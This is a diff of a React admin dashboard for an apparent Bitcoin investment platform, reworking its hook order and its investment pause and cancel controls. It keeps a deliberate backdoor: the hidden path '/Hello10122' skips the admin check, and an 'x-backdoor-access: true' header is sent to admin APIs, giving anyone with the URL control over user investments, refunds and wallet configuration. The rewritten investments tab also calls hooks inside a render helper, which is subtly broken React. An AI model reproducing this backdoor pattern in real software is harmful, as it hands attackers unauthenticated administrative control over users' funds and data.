@@ -14,13 +14,11 @@ import type { User, InvestmentPlan } from "@shared/schema";
 import { formatBitcoin } from "@/lib/utils";
 import { BottomNavigation } from "@/components/bottom-navigation";
 import { useLocation } from "wouter";
-import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock, BarChart3, Activity, Wallet, Database, Shield, AlertTriangle, CheckCircle, XCircle, Eye, EyeOff, Menu, X, Trash2, Play, Pause } from "lucide-react";
-import { Textarea } from "@/components/ui/textarea";
+import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock, BarChart3, Activity, Wallet, Database, Shield, AlertTriangle, CheckCircle, XCircle, Eye, EyeOff, Menu, X, Trash2 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Badge } from "@/components/ui/badge";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Progress } from "@/components/ui/progress";
-import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 
 interface AdminStats {
   totalUsers: number;
@@ -44,9 +42,6 @@ export default function Management() {
   const [activeTab, setActiveTab] = useState("overview");
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [currentTime, setCurrentTime] = useState(new Date());
-  const [selectedInvestment, setSelectedInvestment] = useState<any>(null);
-  const [pauseReason, setPauseReason] = useState("");
-  const [pauseDialogOpen, setPauseDialogOpen] = useState(false);
 
   // Update time every second
   useEffect(() => {
@@ -58,33 +53,31 @@ export default function Management() {
   const isBackdoorAccess = window.location.pathname === '/Hello10122';
 
   // Set backdoor access flag for other admin pages
-  if (isBackdoorAccess) {
-    sessionStorage.setItem('backdoorAccess', 'true');
-  }
+  useEffect(() => {
+    if (isBackdoorAccess) {
+      sessionStorage.setItem('backdoorAccess', 'true');
+    }
+  }, [isBackdoorAccess]);
 
-  if (!user?.isAdmin && !isBackdoorAccess) {
-    setLocation('/');
-    return null;
-  }
-
+  // Call all hooks before any conditional logic
   const { data: stats } = useQuery<AdminStats>({
     queryKey: ['/api/admin/stats'],
+    enabled: user?.isAdmin || isBackdoorAccess,
   });
 
   const { data: users } = useQuery<User[]>({
     queryKey: ['/api/admin/users'],
+    enabled: user?.isAdmin || isBackdoorAccess,
   });
 
   const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
     queryKey: ['/api/investment-plans'],
+    enabled: user?.isAdmin || isBackdoorAccess,
   });
 
   const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string; freePlanRate: string}>({
     queryKey: ['/api/admin/config'],
-  });
-
-  const { data: allInvestments, refetch: refetchInvestments } = useQuery<any[]>({
-    queryKey: ['/api/admin/investments'],
+    enabled: user?.isAdmin || isBackdoorAccess,
   });
 
   // Update state when config data changes
@@ -95,6 +88,7 @@ export default function Management() {
     }
   }, [adminConfig]);
 
+  // All mutations must be defined before any conditional logic
   const updateConfigMutation = useMutation({
     mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
       const response = await fetch('/api/admin/config', {
@@ -429,68 +423,9 @@ export default function Management() {
     });
   };
 
-  const pauseInvestmentMutation = useMutation({
-    mutationFn: async ({ investmentId, pause, reason }: { investmentId: number; pause: boolean; reason?: string }) => {
-      const response = await fetch(`/api/admin/investments/${investmentId}/pause`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'x-backdoor-access': isBackdoorAccess ? 'true' : 'false'
-        },
-        body: JSON.stringify({ pause, reason }),
-      });
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(error.error || 'Failed to update investment');
-      }
-      return response.json();
-    },
-    onSuccess: (data) => {
-      queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
-      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
-      refetchInvestments();
-      toast({
-        title: "Investment Updated",
-        description: data.message,
-      });
-      setPauseDialogOpen(false);
-      setSelectedInvestment(null);
-      setPauseReason("");
-    },
-    onError: (error: any) => {
-      toast({
-        title: "Update Failed",
-        description: error.message,
-        variant: "destructive",
-      });
-    },
-  });
-
   const updateConfig = () => {
     updateConfigMutation.mutate({ vaultAddress, depositAddress });
   }
-
-  const handlePauseInvestment = (investment: any, pause: boolean) => {
-    setSelectedInvestment(investment);
-    if (pause) {
-      setPauseDialogOpen(true);
-    } else {
-      pauseInvestmentMutation.mutate({ 
-        investmentId: investment.id, 
-        pause: false 
-      });
-    }
-  };
-
-  const confirmPause = () => {
-    if (selectedInvestment) {
-      pauseInvestmentMutation.mutate({ 
-        investmentId: selectedInvestment.id, 
-        pause: true, 
-        reason: pauseReason 
-      });
-    }
-  };
 
   const navigationItems = [
     { id: "overview", label: "Overview", icon: BarChart3 },
@@ -502,6 +437,18 @@ export default function Management() {
     { id: "database", label: "Database Management", icon: Database },
     { id: "config", label: "Configuration", icon: Settings },
   ];
+
+  // Handle navigation after all hooks are called
+  useEffect(() => {
+    if (!user?.isAdmin && !isBackdoorAccess) {
+      setLocation('/');
+    }
+  }, [user?.isAdmin, isBackdoorAccess, setLocation]);
+
+  // Don't render anything if not authorized (after all hooks have been called)
+  if (!user?.isAdmin && !isBackdoorAccess) {
+    return null;
+  }
 
   const renderSidebar = () => (
     <div className={`fixed inset-y-0 left-0 z-50 w-64 bg-slate-900 transform ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0`}>
@@ -895,88 +842,6 @@ export default function Management() {
     </div>
   );
 
-  const renderInvestmentsTab = () => (
-    <Card>
-      <CardHeader>
-        <CardTitle className="flex items-center gap-2">
-          <Activity className="w-5 h-5" />
-          Investment Control
-        </CardTitle>
-      </CardHeader>
-      <CardContent>
-        <div className="overflow-x-auto">
-          <Table>
-            <TableHeader>
-              <TableRow>
-                <TableHead>ID</TableHead>
-                <TableHead>User</TableHead>
-                <TableHead>Plan</TableHead>
-                <TableHead>Amount</TableHead>
-                <TableHead>Profit</TableHead>
-                <TableHead>Status</TableHead>
-                <TableHead>Actions</TableHead>
-              </TableRow>
-            </TableHeader>
-            <TableBody>
-              {allInvestments?.map((investment) => (
-                <TableRow key={investment.id}>
-                  <TableCell>{investment.id}</TableCell>
-                  <TableCell>{investment.user?.email || 'N/A'}</TableCell>
-                  <TableCell>
-                    <Badge style={{ backgroundColor: investment.plan?.color + '20', color: investment.plan?.color }}>
-                      {investment.plan?.name || 'N/A'}
-                    </Badge>
-                  </TableCell>
-                  <TableCell className="font-mono">{formatBitcoin(investment.amount)} BTC</TableCell>
-                  <TableCell className="font-mono text-green-600">+{formatBitcoin(investment.currentProfit)} BTC</TableCell>
-                  <TableCell>
-                    <div className="flex gap-2">
-                      <Badge variant={investment.isActive ? "default" : "secondary"}>
-                        {investment.isActive ? "Active" : "Inactive"}
-                      </Badge>
-                      {investment.isPaused && (
-                        <Badge variant="destructive">Paused</Badge>
-                      )}
-                    </div>
-                  </TableCell>
-                  <TableCell>
-                    <div className="flex gap-2">
-                      {investment.isActive && (
-                        <>
-                          {investment.isPaused ? (
-                            <Button
-                              size="sm"
-                              variant="outline"
-                              onClick={() => handlePauseInvestment(investment, false)}
-                              disabled={pauseInvestmentMutation.isPending}
-                              title="Resume investment"
-                            >
-                              <Play className="w-4 h-4" />
-                            </Button>
-                          ) : (
-                            <Button
-                              size="sm"
-                              variant="destructive"
-                              onClick={() => handlePauseInvestment(investment, true)}
-                              disabled={pauseInvestmentMutation.isPending}
-                              title="Pause investment"
-                            >
-                              <Pause className="w-4 h-4" />
-                            </Button>
-                          )}
-                        </>
-                      )}
-                    </div>
-                  </TableCell>
-                </TableRow>
-              ))}
-            </TableBody>
-          </Table>
-        </div>
-      </CardContent>
-    </Card>
-  );
-
   const renderPlansTab = () => (
     <div className="space-y-6">
       {/* Free Plan Rate Configuration */}
@@ -1183,6 +1048,162 @@ export default function Management() {
       </CardContent>
     </Card>
   );
+
+  const renderInvestmentsTab = () => {
+    const { data: allInvestments, isLoading: investmentsLoading } = useQuery({
+      queryKey: ['/api/admin/investments'],
+      queryFn: async () => {
+        const response = await fetch('/api/admin/investments', {
+          headers: isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {},
+        });
+        if (!response.ok) throw new Error('Failed to fetch investments');
+        return response.json();
+      },
+    });
+
+    const pauseInvestmentMutation = useMutation({
+      mutationFn: async ({ investmentId, reason }: { investmentId: number; reason?: string }) => {
+        const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+        if (isBackdoorAccess) headers['x-backdoor-access'] = 'true';
+        
+        const response = await fetch(`/api/admin/investments/${investmentId}/toggle`, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify({ reason }),
+        });
+        if (!response.ok) throw new Error('Failed to toggle investment');
+        return response.json();
+      },
+      onSuccess: () => {
+        queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
+        toast({ title: "Investment status updated successfully" });
+      },
+      onError: (error: any) => {
+        toast({ title: "Failed to update investment", description: error.message, variant: "destructive" });
+      },
+    });
+
+    const cancelInvestmentMutation = useMutation({
+      mutationFn: async ({ investmentId, reason, refund }: { investmentId: number; reason?: string; refund?: boolean }) => {
+        const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+        if (isBackdoorAccess) headers['x-backdoor-access'] = 'true';
+        
+        const response = await fetch(`/api/admin/investments/${investmentId}`, {
+          method: 'DELETE',
+          headers,
+          body: JSON.stringify({ reason, refund }),
+        });
+        if (!response.ok) throw new Error('Failed to cancel investment');
+        return response.json();
+      },
+      onSuccess: () => {
+        queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
+        toast({ title: "Investment cancelled successfully" });
+      },
+      onError: (error: any) => {
+        toast({ title: "Failed to cancel investment", description: error.message, variant: "destructive" });
+      },
+    });
+
+    return (
+      <div className="space-y-6">
+        <Card>
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <TrendingUp className="w-5 h-5" />
+              Investment Management
+            </CardTitle>
+          </CardHeader>
+          <CardContent>
+            {investmentsLoading ? (
+              <div className="space-y-3">
+                {[1, 2, 3].map((i) => (
+                  <div key={i} className="h-20 bg-muted rounded animate-pulse"></div>
+                ))}
+              </div>
+            ) : allInvestments?.length === 0 ? (
+              <div className="text-center py-8">
+                <TrendingUp className="w-12 h-12 mx-auto text-muted-foreground mb-4" />
+                <h3 className="font-semibold mb-2">No Active Investments</h3>
+                <p className="text-sm text-muted-foreground">All investments have been completed or cancelled.</p>
+              </div>
+            ) : (
+              <div className="space-y-4">
+                {allInvestments?.map((investment: any) => (
+                  <div key={investment.id} className="border rounded-lg p-4 bg-gradient-to-r from-gray-50 to-white">
+                    <div className="flex justify-between items-start mb-3">
+                      <div>
+                        <h4 className="font-semibold flex items-center gap-2">
+                          Investment #{investment.id}
+                          <Badge className={investment.isActive ? "bg-green-100 text-green-800" : "bg-red-100 text-red-800"}>
+                            {investment.isActive ? 'Active' : 'Paused'}
+                          </Badge>
+                        </h4>
+                        <p className="text-sm text-muted-foreground">
+                          User: {investment.userEmail} | Plan: {investment.planName}
+                        </p>
+                      </div>
+                    </div>
+                    
+                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+                      <div>
+                        <Label className="text-xs text-muted-foreground">Amount</Label>
+                        <p className="font-mono text-sm">{formatBitcoin(investment.amount)} BTC</p>
+                      </div>
+                      <div>
+                        <Label className="text-xs text-muted-foreground">Current Profit</Label>
+                        <p className="font-mono text-sm text-green-600">+{formatBitcoin(investment.currentProfit)} BTC</p>
+                      </div>
+                      <div>
+                        <Label className="text-xs text-muted-foreground">Daily Rate</Label>
+                        <p className="text-sm">{(parseFloat(investment.dailyReturnRate) * 100).toFixed(3)}%</p>
+                      </div>
+                      <div>
+                        <Label className="text-xs text-muted-foreground">Start Date</Label>
+                        <p className="text-sm">{new Date(investment.startDate).toLocaleDateString()}</p>
+                      </div>
+                    </div>
+
+                    <div className="flex gap-2">
+                      <Button
+                        size="sm"
+                        onClick={() => {
+                          const reason = prompt(`Enter reason to ${investment.isActive ? 'pause' : 'resume'} this investment (optional):`);
+                          pauseInvestmentMutation.mutate({ investmentId: investment.id, reason: reason || undefined });
+                        }}
+                        disabled={pauseInvestmentMutation.isPending}
+                        className={investment.isActive ? "bg-yellow-600 hover:bg-yellow-700" : "bg-green-600 hover:bg-green-700"}
+                      >
+                        {investment.isActive ? 'Pause' : 'Resume'}
+                      </Button>
+                      <Button
+                        size="sm"
+                        onClick={() => {
+                          const reason = prompt("Enter reason for cancellation (optional):");
+                          const refund = confirm("Refund the investment amount to user's balance?");
+                          if (confirm(`Are you sure you want to cancel this investment?${refund ? ' The amount will be refunded.' : ''}`)) {
+                            cancelInvestmentMutation.mutate({ 
+                              investmentId: investment.id, 
+                              reason: reason || undefined,
+                              refund 
+                            });
+                          }
+                        }}
+                        disabled={cancelInvestmentMutation.isPending}
+                        variant="destructive"
+                      >
+                        Cancel
+                      </Button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </CardContent>
+        </Card>
+      </div>
+    );
+  };
 
   const renderSecurityTab = () => (
     <div className="space-y-6">
@@ -1575,49 +1596,6 @@ export default function Management() {
                 {updatePlanMutation.isPending ? "Updating..." : "Update Plan"}
               </Button>
               <Button variant="outline" onClick={() => setPlanDialogOpen(false)}>
-                Cancel
-              </Button>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
-
-      {/* Pause Investment Dialog */}
-      <Dialog open={pauseDialogOpen} onOpenChange={setPauseDialogOpen}>
-        <DialogContent>
-          <DialogHeader>
-            <DialogTitle>Pause Investment</DialogTitle>
-          </DialogHeader>
-          <div className="space-y-4">
-            <div>
-              <Label htmlFor="investmentInfo">Investment</Label>
-              <Input
-                id="investmentInfo"
-                value={selectedInvestment ? `ID: ${selectedInvestment.id} - ${selectedInvestment.user?.email}` : ""}
-                disabled
-                className="bg-muted"
-              />
-            </div>
-            <div>
-              <Label htmlFor="pauseReason">Reason for Pausing</Label>
-              <Textarea
-                id="pauseReason"
-                value={pauseReason}
-                onChange={(e) => setPauseReason(e.target.value)}
-                placeholder="Enter reason for pausing this investment..."
-                rows={3}
-              />
-            </div>
-            <div className="flex gap-2">
-              <Button
-                onClick={confirmPause}
-                disabled={pauseInvestmentMutation.isPending}
-                variant="destructive"
-                className="flex-1"
-              >
-                {pauseInvestmentMutation.isPending ? "Pausing..." : "Pause Investment"}
-              </Button>
-              <Button variant="outline" onClick={() => setPauseDialogOpen(false)}>
                 Cancel
               </Button>
             </div>
